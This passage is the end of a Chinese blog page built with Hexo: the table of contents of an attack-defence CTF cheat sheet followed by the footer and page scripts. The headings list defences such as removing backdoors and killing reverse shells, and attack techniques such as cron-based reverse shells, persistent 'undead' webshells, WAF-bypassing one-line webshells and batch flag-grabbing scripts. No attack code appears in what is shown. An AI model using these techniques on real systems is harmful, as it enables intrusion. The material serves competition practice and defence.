class="nav-link" href="#根据备份的源码恢复网站"><span class="nav-number">1.2.9.</span> <span class="nav-text">根据备份的源码恢复网站</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查找后门"><span class="nav-number">1.2.10.</span> <span class="nav-text">查找后门</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查找flag的位置"><span class="nav-number">1.2.11.</span> <span class="nav-text">查找flag的位置</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修改flag文件权限和设置不可更改"><span class="nav-number">1.2.12.</span> <span class="nav-text">修改flag文件权限和设置不可更改</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#克制不死马"><span class="nav-number">1.2.13.</span> <span class="nav-text">克制不死马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#干掉反弹shell"><span class="nav-number">1.2.14.</span> <span class="nav-text">干掉反弹shell</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加固"><span class="nav-number">1.3.</span> <span class="nav-text">加固</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#更改ssh登录密码"><span class="nav-number">1.3.1.</span> <span class="nav-text">更改ssh登录密码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#更改vnc登录密码（没有的情况下不用）"><span class="nav-number">1.3.2.</span> <span class="nav-text">更改vnc登录密码（没有的情况下不用）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#加固web服务器方法"><span class="nav-number">1.3.3.</span> <span class="nav-text">加固web服务器方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#加固数据库"><span class="nav-number">1.3.4.</span> <span class="nav-text">加固数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#加固ftp服务"><span class="nav-number">1.3.5.</span> <span class="nav-text">加固ftp服务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关闭不需要的服务和守护进程"><span class="nav-number">1.3.6.</span> <span class="nav-text">关闭不需要的服务和守护进程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#开启内存地址随机化（防止pwn程序的利用）"><span class="nav-number">1.3.7.</span> <span class="nav-text">开启内存地址随机化（防止pwn程序的利用）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#自启动相关"><span class="nav-number">1.3.8.</span> <span class="nav-text">自启动相关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#防火墙"><span class="nav-number">1.3.9.</span> <span class="nav-text">防火墙</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#定时任务"><span class="nav-number">1.3.10.</span> <span class="nav-text">定时任务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#移动系统命令（最后的大招）"><span class="nav-number">1.3.11.</span> <span class="nav-text">移动系统命令（最后的大招）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击"><span class="nav-number">2.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#权限维持-后门技术"><span class="nav-number">2.1.</span> <span class="nav-text">权限维持/后门技术</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#定时任务反弹shell"><span class="nav-number">2.1.1.</span> <span class="nav-text">定时任务反弹shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#不死马"><span class="nav-number">2.1.2.</span> <span class="nav-text">不死马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#linux命令不死马"><span class="nav-number">2.1.3.</span> <span class="nav-text">linux命令不死马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过盾一句话"><span class="nav-number">2.1.4.</span> <span class="nav-text">过盾一句话</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#批量GETflag方法"><span class="nav-number">2.2.</span> <span class="nav-text">批量GETflag方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#批量获取提交flag脚本"><span class="nav-number">2.2.1.</span> <span class="nav-text">批量获取提交flag脚本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#web漏洞获取flag"><span class="nav-number">2.2.2.</span> <span class="nav-text">web漏洞获取flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh获取flag"><span class="nav-number">2.2.3.</span> <span class="nav-text">ssh获取flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#监控"><span class="nav-number">3.</span> <span class="nav-text">监控</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tail命令监控日志"><span class="nav-number">3.1.</span> <span class="nav-text">tail命令监控日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#日志-流量监控"><span class="nav-number">3.2.</span> <span class="nav-text">日志/流量监控</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件监控"><span class="nav-number">3.3.</span> <span class="nav-text">文件监控</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#weblogger（不熟悉暂且不用）"><span class="nav-number">3.4.</span> <span class="nav-text">weblogger（不熟悉暂且不用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#进程-端口监控-不熟悉暂且不用"><span class="nav-number">3.5.</span> <span class="nav-text">进程/端口监控(不熟悉暂且不用)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#部署waf"><span class="nav-number">3.6.</span> <span class="nav-text">部署waf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他"><span class="nav-number">3.7.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Fany</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>
+
+
+
+
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>  Sometimes your whole life boils down to one insame move.
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("07/28/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  
+    
+  
+
+  
+
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.2.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'pbe8vhO6luYrD6pclzm8NQST-gzGzoHsz',
+    appKey: 'sKqLiA3nL8BojxzmOL3HCdGO',
+    placeholder: '非常希望您能留下宝贵的意见！',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+  
+<!--   <link rel="stylesheet" href="https://github.com/fanygit/dist/raw/master/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="https://github.com/fanygit/dist/raw/master/APlayer.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/fanygit/dist/master/music.js"></script> -->
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
